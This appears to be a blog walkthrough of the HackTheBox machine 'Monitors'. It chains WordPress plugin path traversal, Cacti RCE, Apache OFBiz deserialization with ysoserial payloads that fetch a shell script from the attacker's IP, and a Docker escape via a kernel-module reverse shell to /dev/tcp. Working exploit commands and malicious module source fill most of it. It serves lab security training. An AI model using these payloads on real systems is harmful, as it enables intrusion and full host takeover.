---
title: Monitors
date: 2026-05-14
categories: [CTFs, HackTheBox]
tags: [linux, wordpress, lfi, cacti, cve-2020-14295, apache-ofbiz, deserialization, cve-2020-9496, docker-escape, cap_sys_module]
media_subpath: /assets/img/HackTheBox/Monitors
image:
    path: Monitors.webp
    lqip: data:image/webp;base64,UklGRk4AAABXRUJQVlA4IEIAAABQAwCdASoUAAsAPzmGuVOvKSWisAgB4CcJZQAAQpdXJMbAgAD+6PES3QyZxmf9/OIOCje5rnTHTDLygmbPeWqAAAA=
    alt: Info Card
---

## Summary

[Monitors](https://www.hackthebox.com/machines/monitors){: target="_blank" } is a hard Linux machine that demonstrates the chaining of multiple web vulnerabilities and advanced post-exploitation techniques. The attack path starts with exploiting a **WordPress plugin** to perform **SQL injection**, which leads to command injection within a network management application. After gaining a foothold and pivoting via credentials found in service files, the challenge shifts to a Docker container running a vulnerable instance of **Apache OFBiz**. By leveraging a Java-based XML-RPC deserialization attack, we gain access to the container and eventually achieve host-level root privileges by abusing the `CAP_SYS_MODULE` capability to load a malicious kernel module.

## Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.232.111 -oN allports
```

![TCP Scan](image_1.webp)
_TCP Scan_

## Nmap Scripts

```bash
nmap -p22,80 -sCV 10.129.232.111 -oN services
```

![Nmap Scripts](image_2.webp)
_SSH and Web Server_

## Port 80 - Enumeration

When using the browser, the website says we can not access directly via IP and we have a domain.

![Domain](image_3.webp)
_Domain Found_

Once added the domain to our **/etc/hosts** file we get access to a [wordpress](https://wordpress.com/){: target="_blank" } site.

![Wordpress](image_4.webp)
_Powered by Wordpress_

### WP-Plugin Spritz File Inclusion

You can use the following to see installed plugins on Wordpress and with this command we can see that [Wordpress Spritz Plugin](https://github.com/wp-plugins/wp-spritz/){: target="_blank" } is installed.

```bash
curl -s -X GET "http://monitors.htb/" | grep plugins
```

![Spritz Plugin](image_5.webp)
_Spritz Plugin_

At the end of the readme you can see the changelog and its says the current version is 1.0 and there is a vulnerability for this version:

![Spritz README](image_6.webp)
_README File_

![Exploit Found](image_7.webp)
_Vulnerable Version_

It is a [Local File Inclusion](https://brightsec.com/blog/local-file-inclusion-lfi/){: target="_blank" } so we can read internal files from the target.

```bash
searchsploit -x php/webapps/44544.php
```

![LFI](image_8.webp)
_Proof of Concept_

Testing the vulnerability by reading the **/etc/passwd** of the target:

```bash
curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd"
```

![LFI](image_9.webp)
_Vulnerable to LFI_

We can read the configuration file from apache to see if we can get some useful information, for instance we can get a new subdomain.

```bash
curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf"
```

![Cacti Subdomain](image_10.webp)
_Cacti Subdomain_

![Adding Sudomain](image_11.webp)
_Config hosts file_

Once added to the **/etc/hosts** file, we can access it through the browser and it's a login panel for [Cacti](https://www.cacti.net/){: target="_blank" }

![Cacti Login Panel](image_12.webp)
_Cacti Version_

```bash
searchsploit cacti 1.2.12
```

![Exploit Found](image_13.webp)
_Vulnerable to SQLi_

Using `searchsploit` we can see there is an exploit that allows **Remote Command Execution**, but it needs a valid credential.

```bash
searchsploit -x php/webapps/49810.py
```

![Authenticated Exploit](image_14.webp)
_Authenticated Exploit_

We can enumerate a little bit more using the file inclusion we found, because wordpress has a configuration file which stores clear text credentials for the database.

```bash
curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php" | grep "DB_"
```

![Reading wp-config.php](image_15.webp)
_Wordpress Config File_

### Cacti RCE - CVE-2020-14295

We found a password that we can test in the Cacti login panel:

![Valid Creds](image_16.webp)
_Valid Creds_

>**Cacti Credentials**
>
>👉 `admin:BestAdministrator@2020!`
{: .prompt-tip }

Now we can use the exploit to gain access to the target machine.

```bash
searchsploit -m php/webapps/49810.py
```

![Getting the Exploit](image_17.webp)
_Getting the exploit_

As shown below, we need the url, user, password and our ip + listener port.

![Help Panel](image_18.webp)
_Help Panel_

After setting up our listener and executing the exploit with the required arguments we gain access to the machine:

```bash
python3 cacti_exploit.py -t 'http://cacti-admin.monitors.htb' -u admin -p 'BestAdministrator@2020!' --lhost 10.10.15.21 --lport 443
```

![RCE](image_19.webp)
_Initial Access_

## User Pivoting - Reading Hidden Files

As www-data we can not access sensitive files on the **marcus** home directory. However if we know the full path of the file we can try to read it. So to do that we are going to grep recursively for the string **marcus**.

```bash
grep  -i marcus etc/ -R 2>/dev/null
```

![Service File](image_20.webp)
_Service File_

We found backup script that we can read and it has a password that belongs to **marcus**.

```bash
cat /home/marcus/.backup/backup.sh
```

![Backup Script](image_21.webp)
_Backup Script_

>**SSH Credential**
>
>👉 `marcus:VerticalEdge2020`
{: .prompt-tip }

Since `ssh` is available we can access the machine through it.

![Marcus' Note](image_22.webp)
_Marcus' Note_

## Apache Ofbiz Deserialization

In the note, there is a todo list that talks about a docker container. If we try to see the open ports on the target we can notice there is another port that is running locally.

```bash
ss -tlnp
```

![Port 8443](image_23.webp)
_Port 8443_

Since we are using `ssh` we can perform a [Local Port Forwarding](https://phoenixnap.com/kb/ssh-port-forwarding#ftoc-heading-1){: target="_blank" } to access that service in our machine.

```bash
ssh marcus@10.129.232.111 -L 8443:127.0.0.1:8443
```

![SSH Port Forwarding](image_24.webp)
_SSH Port Forwarding_

![Port 8443 available](image_25.webp)
_Port 8443 available_

So now if we access port 8443 in our localhost we can see the service is there but there is no default page. So now we are going to use `gobuster` to  find resource of the server.

![404](image_26.webp)
_404_

```bash
gobuster dir -u https://127.0.0.1:8443/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t100 -k
```

![Fuzzing](image_27.webp)
_Fuzzing_

We found some directories that shows a service called **OFBiz**.

```html
https://127.0.0.1:8443/marketing/control/main
```

![Apache OFBiz](image_28.webp)
_Apache OFBiz_

![Vulnerable Version](image_29.webp)
_Vulnerable to Deserialization Attack_

Using `searchsploit` we can see there is an exploit that allows **Remote Command Execution** exploiting a [Deserialization Attack](https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data){: target="_blank" }

![Script](image_30.webp)
_Script_

The attack abuses de XMLRPC file of the service and we have that file available, so we can exploit this vulnerability.

![Vulnerable Endpoint](image_31.webp)
_Vulnerable Endpoint_

### Manual Exploitation

Since the exploit does not work, we will manually reproduce the exploit step by step.

#### Downloading Required Tools

* First we have to download a specific version of the **jdk** for java because it generates problems with the most recent versions.

```html
https://jdk.java.net/archive/?source=post_page-----2b90f3854fc1--------------------------------
```

You can use the following command to download **openjdk-15.0.1**

```bash
wget https://download.java.net/java/GA/jdk15.0.1/51f4f36ad4ef43e39d0dfdbaf6549e32/9/GPL/openjdk-15.0.1_linux-x64_bin.tar.gz
tar -xf openjdk-15.0.1_linux-x64_bin.tar.gz
```

![Getting JDK](image_32.webp)
_JDK 15.0.1_

As shown below we have jdk verson 15.0.1

![Running Version 15.0.1](image_33.webp)
_Version 15.0.1_

* Then, we have to download the [ysoserial](https://github.com/frohoff/ysoserial){: target="_blank" } which will allows us to serialize our malicious code.

```bash
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

![ysoserial](image_34.webp)
_ysoserial_

#### Apache OFBiz RCE

Once you have the correct jdk and the ysoserial you must run the following command as shown in the exploit. This will download a reverse-shell script from our box.

```bash
./java -jar ysoserial-all.jar CommonsBeanutils1 'wget 10.10.14.2/shell.sh -O /tmp/shell.sh' 2>/dev/null | base64 -w 0
```

![Base64 Payload](image_35.webp)
_Base64 Payload_

Save the output of the previous command in a variable called `payload`

```bash
payload='rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh........'
```

So now we can send the request to the xmlrpc file, we can use the same request of the exploit before. 

>Remember to create your `shell.sh` that contains a reverse shell.
{: .prompt-warning }

```bash
curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml'
```

![Sending the payload](image_36.webp)
_Sending the payload_

After sending the command we saw a request in our python server, so the reverse shell was stored on the target. No we have to change the payload to execute the reverse shell using bash.

```bash
./java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" 2>/dev/null | base64 -w 0
```

![New Base64 Payload](image_37.webp)
_New Base64 Payload_

>Update the `payload` variable with the new base64 string.
{: .prompt-warning }

```bash
payload='<New_Payload_Here!>'
```

As same as before, we have to send the request with our new serialized payload and start our listener and we will get a reverse shell back.

```bash
curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml'
```

![Docker Container](image_38.webp)
_Docker Container_

### Automated Exploitation using msfconsole

OFBiz has a **Metasploit's** module which can easily be used to gain access to the target:

![Module Options](image_39.webp)
_Module Options_

You just have to change the payload and set the options. Then just run the exploit and you are in:

![Automated Exploit](image_40.webp)
_Automated Exploit_

## Privilege Escalation - Docker Escape

If we ran the following command we can get all the capabilities of the container:

```bash
capsh --print
```

![Docker Capabilities](image_41.webp)
_Docker Capabilities_

>`CAP_SYS_MODULE` is a powerful Linux capability that allows a process to load and unload kernel modules (LKM). In the context of container security, if this capability is assigned to a container, the isolation boundary is effectively broken. An attacker can load a malicious driver directly into the host's kernel, granting them complete control over the entire system.
{: .prompt-info }

In this [post](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module){: target="_blank" } there is a way to exploit this capability a gain a reverse shell as root. To do that we have to create the following files:

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.21/9001 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

![Malicious Code](image_42.webp)
_Malicious Code_

```
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{: file="Makefile" }

![Makefile](image_43.webp)
_Makefile_

So now we have to execute `make` and it will create the module we have to load.

![Malicious Module](image_44.webp)
Malicious Module_

Start your listener a run the following command to load the module and you will get a shell as root on the target, not the container.

```bash
insmod reverse-shell.ko
```

![Root Access](image_45.webp)
_Root Access_

## Flags

- [x] user.txt

```bash
cat /home/marcus/user.txt 
851**************************ed4
```

- [x] root.txt

```bash
cat /root/root.txt 
519**************************869
```

<h2 style="text-align:center;">Appreciate the support! Stay tuned for more walkthroughs. ✌️💻</h2>
{: data-toc-skip='' .mt-4 .mb-0 }
